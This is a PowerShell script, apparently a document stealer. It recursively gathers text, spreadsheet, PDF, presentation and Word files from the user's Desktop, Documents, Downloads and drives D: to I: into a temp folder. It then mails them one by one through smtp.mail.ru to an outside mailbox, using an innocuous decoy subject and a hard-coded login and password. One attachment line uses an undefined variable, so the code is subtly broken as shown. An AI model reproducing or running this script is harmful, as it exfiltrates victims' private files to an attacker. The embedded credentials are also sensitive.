New-Item -Path 'C:\Windows\Temp\test' -ItemType Directory
$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads",'D:\','E:\','F:\','G:\','H:\','I:\' 
#copy files to one folder
foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx -Recurse | %{$_.FullName}){    
    
    $files | Copy-Item -Destination C:\Windows\Temp\test
    
}


$items = Get-ChildItem C:\Windows\Temp\test\* | %{$_.FullName}
foreach($file in $items){
    $EmailTo = "louist@internet.ru"
    $EmailFrom = "louist@internet.ru"
    $Subject = "hello there!!" 
    $Body = "how are you??"
    $smtpServer = "smtp.mail.ru" 
    $smtpMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
    $attach = new-object Net.Mail.Attachment($attachment)
    $smtpMessage.Attachments.Add($attach)
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
    $SMTPClient.EnableSsl = $true 
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("louist@internet.ru", "DAXR9gkh5ukkzPPmpDuR"); 
    $SMTPClient.Send($smtpMessage)

}



